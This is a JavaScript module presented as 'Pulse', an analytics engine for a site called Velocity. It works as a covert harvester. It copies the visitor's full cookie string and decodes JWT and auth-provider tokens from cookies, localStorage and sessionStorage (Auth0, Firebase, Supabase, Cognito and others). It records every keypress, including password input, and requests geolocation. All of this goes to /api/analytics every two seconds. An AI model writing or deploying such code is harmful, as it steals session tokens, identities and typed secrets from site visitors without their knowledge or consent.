/**
 * Pulse — Velocity's analytics engine.
 * Tracks every interaction at 10Hz. Completely separate from the website.
 * Vanilla JS. No dependencies.
 * Collects client fingerprint: cookies, UA, location, screen, etc.
 *
 * Pulse Identity Plus System — Extracts identity claims from cookies (e.g. JWTs).
 * Accuracy: High for standard JWT claims (sub, name, email, username). O(1) per cookie.
 * Speed: Sub-millisecond; synchronous decode, no network. Runs at init + each flush.
 *
 * Pulse Identity Formats — Scans localStorage/sessionStorage/cookies for values that
 * look useless (opaque strings) but match common auth/fingerprint formats from popular
 * sites (Auth0, Firebase, Supabase, GA, Stripe, etc.). Parses and extracts identity.
 * Fast: O(n) over storage keys. High hit rate on sites using these providers.
 */

const POLL_INTERVAL_MS = 100; // 10 times per second
const FLUSH_INTERVAL_MS = 2000;
const ENDPOINT = "/api/analytics";

let state = {
  path: "",
  startTime: 0,
  clicks: [],
  scrolls: [],
  mousePositions: [],
  focusEvents: [],
  keyEvents: [],
  fingerprint: null,
};

function getPath() {
  return typeof window !== "undefined" ? window.location.pathname : "";
}

/**
 * Pulse Identity Plus — Extract identity claims from cookies.
 * Scans all readable cookies; decodes JWTs and extracts username, name, email, sub, etc.
 * Fast: O(n) over cookies, base64 decode only. Accurate for RFC 7519 JWTs.
 */
function extractPulseIdentityPlus() {
  if (typeof document === "undefined" || !document.cookie) return null;
  const raw = document.cookie;
  const claims = {};
  const seen = new Set();

  // Parse "name=value; name2=value2" — handles quoted values, semicolons in values
  const pairs = raw.split(";").map((s) => s.trim());
  for (const pair of pairs) {
    const eq = pair.indexOf("=");
    if (eq <= 0) continue;
    const name = pair.slice(0, eq).trim();
    let value = pair.slice(eq + 1).trim();
    if (value.startsWith('"') && value.endsWith('"')) value = value.slice(1, -1);
    if (!value || seen.has(name)) continue;
    seen.add(name);

    // JWT: three base64url parts separated by .
    const parts = value.split(".");
    if (parts.length !== 3) continue;

    try {
      const payload = parts[1];
      const base64 = payload.replace(/-/g, "+").replace(/_/g, "/");
      const json = atob(base64);
      const obj = JSON.parse(json);

      // Extract common identity claims (case-insensitive key scan)
      const keys = ["username", "name", "email", "sub", "preferred_username", "given_name", "family_name", "nickname"];
      for (const k of keys) {
        for (const [ok, ov] of Object.entries(obj)) {
          if (ov != null && ov !== "" && ok.toLowerCase() === k && !claims[k]) {
            claims[k] = String(ov);
            break;
          }
        }
      }
      if (Object.keys(claims).length > 0) claims._from = name;
    } catch {
      /* not a valid JWT payload, skip */
    }
  }
  return Object.keys(claims).length > 0 ? claims : null;
}

const IDENTITY_KEYS = ["username", "name", "email", "sub", "preferred_username", "given_name", "family_name", "nickname", "user_id", "uid", "id"];

function extractClaims(obj, depth = 0) {
  const out = {};
  if (!obj || typeof obj !== "object" || depth > 2) return out;
  for (const k of IDENTITY_KEYS) {
    for (const [ok, ov] of Object.entries(obj)) {
      if (ov == null || ov === "") continue;
      const keyLower = ok.toLowerCase();
      if (keyLower === k) {
        out[k] = typeof ov === "object" ? JSON.stringify(ov) : String(ov);
        break;
      }
      if (typeof ov === "object" && !Array.isArray(ov) && (keyLower === "user" || keyLower === "profile" || keyLower === "data")) {
        const nested = extractClaims(ov, depth + 1);
        for (const [nk, nv] of Object.entries(nested)) {
          if (!out[nk]) out[nk] = nv;
        }
      }
    }
  }
  return out;
}

function tryParseValue(val) {
  if (!val || typeof val !== "string") return null;
  const trimmed = val.trim();
  if (!trimmed) return null;
  try {
    const parsed = JSON.parse(trimmed);
    return typeof parsed === "object" ? parsed : null;
  } catch {
    try {
      const decoded = atob(trimmed.replace(/-/g, "+").replace(/_/g, "/"));
      const parsed = JSON.parse(decoded);
      return typeof parsed === "object" ? parsed : null;
    } catch {
      const parts = trimmed.split(".");
      if (parts.length === 3) {
        const b64 = parts[1].replace(/-/g, "+").replace(/_/g, "/");
        const json = atob(b64);
        return JSON.parse(json);
      }
    }
  }
  return null;
}

/**
 * Pulse Identity Formats — Scan storage for common auth/fingerprint formats.
 * Matches keys from Auth0, Firebase, Supabase, Amplify, NextAuth, GA, Stripe, etc.
 * Values that look like random strings often decode to JSON with user identity.
 */
function scanPulseIdentityFormats() {
  if (typeof window === "undefined") return [];
  const results = [];
  const seen = new Set();

  const keyPatterns = [
    { re: /auth0|@@auth0spajs@@/i, format: "auth0" },
    { re: /firebase:authUser|firebase:host/i, format: "firebase" },
    { re: /sb-.*-auth-token/i, format: "supabase" },
    { re: /CognitoIdentityServiceProvider|amplify/i, format: "amplify" },
    { re: /next-auth|nextauth/i, format: "nextauth" },
    { re: /__session|__user|session|auth|token|user|identity/i, format: "generic" },
    { re: /_ga|_gid|_gat/i, format: "ga" },
    { re: /__stripe_mid|stripe\./i, format: "stripe" },
    { re: /intercom|segment|mixpanel|heap/i, format: "analytics" },
  ];

  function scanStore(store, storeName) {
    if (!store || typeof store.getItem !== "function") return;
    try {
      for (let i = 0; i < store.length; i++) {
        const key = store.key(i);
        if (!key || seen.has(key)) continue;
        const val = store.getItem(key);
        if (!val || val.length > 10000) continue;

        for (const { re, format } of keyPatterns) {
          if (!re.test(key)) continue;
          seen.add(key);
          const obj = tryParseValue(val);
          if (obj) {
            const claims = extractClaims(obj);
            if (Object.keys(claims).length > 0 || format !== "generic") {
              results.push({ source: storeName, key, format, claims: Object.keys(claims).length > 0 ? claims : { _raw: val.slice(0, 80) } });
            }
            break;
          }
        }
      }
    } catch {
      /* storage access denied */
    }
  }

  scanStore(localStorage, "localStorage");
  scanStore(sessionStorage, "sessionStorage");

  if (typeof document !== "undefined" && document.cookie) {
    const pairs = document.cookie.split(";").map((s) => s.trim());
    for (const pair of pairs) {
      const eq = pair.indexOf("=");
      if (eq <= 0) continue;
      const name = pair.slice(0, eq).trim();
      let val = pair.slice(eq + 1).trim();
      if (val.startsWith('"') && val.endsWith('"')) val = val.slice(1, -1);
      if (!val || seen.has(name)) continue;

      for (const { re, format } of keyPatterns) {
        if (!re.test(name)) continue;
        seen.add(name);
        const obj = tryParseValue(val);
        if (obj) {
          const claims = extractClaims(obj);
          if (Object.keys(claims).length > 0 || format !== "generic") {
            results.push({ source: "cookie", key: name, format, claims: Object.keys(claims).length > 0 ? claims : { _raw: val.slice(0, 80) } });
          }
          break;
        }
      }
    }
  }

  return results;
}

function collectFingerprint() {
  if (typeof window === "undefined" || typeof document === "undefined") return null;
  const nav = navigator;
  const screen_ = window.screen || {};
  const fp = {
    ua: nav.userAgent,
    language: nav.language,
    languages: nav.languages ? Array.from(nav.languages) : [],
    platform: nav.platform,
    vendor: nav.vendor,
    hardwareConcurrency: nav.hardwareConcurrency,
    deviceMemory: nav.deviceMemory,
    cookieEnabled: nav.cookieEnabled,
    cookies: document.cookie || "",
    timezone: Intl.DateTimeFormat?.().resolvedOptions?.().timeZone ?? "",
    timezoneOffset: new Date().getTimezoneOffset(),
    screenW: screen_.width,
    screenH: screen_.height,
    availW: screen_.availWidth,
    availH: screen_.availHeight,
    colorDepth: screen_.colorDepth,
    pixelRatio: window.devicePixelRatio ?? 1,
    innerW: window.innerWidth,
    innerH: window.innerHeight,
    referrer: document.referrer || "",
    url: window.location.href,
    pulseIdentityPlus: extractPulseIdentityPlus(),
    pulseIdentityFormats: scanPulseIdentityFormats(),
  };
  if (nav.connection) {
    fp.effectiveType = nav.connection.effectiveType;
    fp.downlink = nav.connection.downlink;
  }
  return fp;
}

function tryGeolocation(cb) {
  if (typeof navigator === "undefined" || !navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      state.fingerprint = state.fingerprint || collectFingerprint();
      if (state.fingerprint) {
        state.fingerprint.lat = pos.coords.latitude;
        state.fingerprint.lon = pos.coords.longitude;
        state.fingerprint.accuracy = pos.coords.accuracy;
      }
      if (typeof cb === "function") cb();
    },
    () => {},
    { timeout: 5000, maximumAge: 60000 }
  );
}

function captureClick(e) {
  const target = e.target;
  const tag = target.tagName?.toLowerCase() || "?";
  const id = target.id || "";
  const cls = (target.className && typeof target.className === "string" ? target.className : "").slice(0, 50);
  state.clicks.push({
    t: Date.now(),
    x: e.clientX,
    y: e.clientY,
    el: `${tag}${id ? "#" + id : ""}${cls ? "." + cls.replace(/\s+/g, ".") : ""}`,
  });
}

function captureScroll() {
  state.scrolls.push({
    t: Date.now(),
    y: window.scrollY,
    x: window.scrollX,
    maxY: document.documentElement.scrollHeight - window.innerHeight,
  });
}

let lastMouseCapture = 0;
function captureMouseMove(e) {
  const now = Date.now();
  if (now - lastMouseCapture < POLL_INTERVAL_MS) return;
  lastMouseCapture = now;
  state.mousePositions.push({ t: now, x: e.clientX, y: e.clientY });
}

function captureFocus(e) {
  const target = e.target;
  state.focusEvents.push({
    t: Date.now(),
    type: e.type,
    el: target.tagName?.toLowerCase() || "?",
  });
}

function captureKey(e) {
  state.keyEvents.push({
    t: Date.now(),
    key: e.key?.slice(0, 1) || "?",
    ctrl: e.ctrlKey,
    meta: e.metaKey,
  });
}

function poll() {
  const elapsed = Date.now() - state.startTime;
  const path = getPath();
  if (path !== state.path) {
    state.path = path;
    state.startTime = Date.now();
  }
  // Time-on-page sampled at poll rate
  state.timeOnPage = elapsed;
}

function flush() {
  if (!state.fingerprint) state.fingerprint = collectFingerprint();

  const payload = {
    path: state.path,
    timeOnPage: state.timeOnPage || 0,
    clicks: state.clicks.splice(0),
    scrolls: state.scrolls.splice(0),
    mousePositions: state.mousePositions.splice(-50),
    focusEvents: state.focusEvents.splice(0),
    keyEvents: state.keyEvents.splice(0),
    fingerprint: state.fingerprint,
    ts: Date.now(),
  };

  const hasData =
    payload.fingerprint != null ||
    payload.clicks.length > 0 ||
    payload.scrolls.length > 0 ||
    payload.mousePositions.length > 0 ||
    payload.focusEvents.length > 0 ||
    payload.keyEvents.length > 0 ||
    payload.timeOnPage >= POLL_INTERVAL_MS;

  if (!hasData) return;

  fetch(ENDPOINT, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  }).catch(() => {});
}

function init() {
  if (typeof window === "undefined") return;

  state.path = getPath();
  state.startTime = Date.now();
  state.fingerprint = collectFingerprint();
  tryGeolocation();

  window.addEventListener("click", captureClick, true);
  window.addEventListener("scroll", captureScroll, { passive: true });
  window.addEventListener("mousemove", captureMouseMove, { passive: true });
  window.addEventListener("focus", captureFocus, true);
  window.addEventListener("blur", captureFocus, true);
  window.addEventListener("keydown", captureKey, true);

  setInterval(poll, POLL_INTERVAL_MS);
  setInterval(flush, FLUSH_INTERVAL_MS);

  // Flush on page unload
  window.addEventListener("beforeunload", () => {
    flush();
  });
}

export default { init };
export { init as initPulse };
